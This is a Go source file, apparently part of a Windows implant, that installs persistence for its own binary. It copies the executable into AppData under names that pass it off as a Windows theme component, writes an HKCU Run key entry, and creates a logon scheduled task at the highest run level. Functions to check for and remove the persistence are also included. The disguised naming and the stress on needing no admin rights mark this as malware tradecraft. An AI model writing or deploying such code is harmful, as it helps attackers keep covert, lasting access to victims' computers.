//go:build windows

package main

import (
	"io"
	"os"
	"path/filepath"

	"golang.org/x/sys/windows/registry"
)

const (
	persistDir     = `Microsoft\Windows\Themes`
	persistExeName = "WinThemeHelper.exe"
	regRunKey      = `Software\Microsoft\Windows\CurrentVersion\Run`
	regRunValue    = "WinThemeHelper"
)

func installPersistence() {
	exe, err := os.Executable()
	if err != nil {
		return
	}

	destDir := filepath.Join(os.Getenv("APPDATA"), persistDir)
	os.MkdirAll(destDir, 0755)
	dest := filepath.Join(destDir, persistExeName)

	// Skip if already running from the installed location
	if exe == dest {
		return
	}

	if err := copyBinary(exe, dest); err != nil {
		// Fallback: try LocalAppData
		destDir = filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Windows", "Cache")
		os.MkdirAll(destDir, 0755)
		dest = filepath.Join(destDir, persistExeName)
		if err := copyBinary(exe, dest); err != nil {
			return
		}
	}

	// HKCU Run key — survives without admin
	k, _, err := registry.CreateKey(registry.CURRENT_USER, regRunKey, registry.SET_VALUE)
	if err != nil {
		return
	}
	defer k.Close()
	k.SetStringValue(regRunValue, `"`+dest+`"`)

	// Scheduled task as a second layer (requires no elevation via /f)
	runShell(`schtasks /create /tn "WindowsThemeService" /tr "` + dest + `" /sc onlogon /f /rl HIGHEST 2>nul`)
}

func isPersisted() bool {
	k, err := registry.OpenKey(registry.CURRENT_USER, regRunKey, registry.QUERY_VALUE)
	if err != nil {
		return false
	}
	defer k.Close()
	val, _, err := k.GetStringValue(regRunValue)
	return err == nil && val != ""
}

func removePersistence() {
	k, err := registry.OpenKey(registry.CURRENT_USER, regRunKey, registry.SET_VALUE)
	if err == nil {
		k.DeleteValue(regRunValue)
		k.Close()
	}
	runShell(`schtasks /delete /tn "WindowsThemeService" /f 2>nul`)
}

func copyBinary(src, dst string) error {
	s, err := os.Open(src)
	if err != nil {
		return err
	}
	defer s.Close()

	d, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer d.Close()

	_, err = io.Copy(d, s)
	return err
}
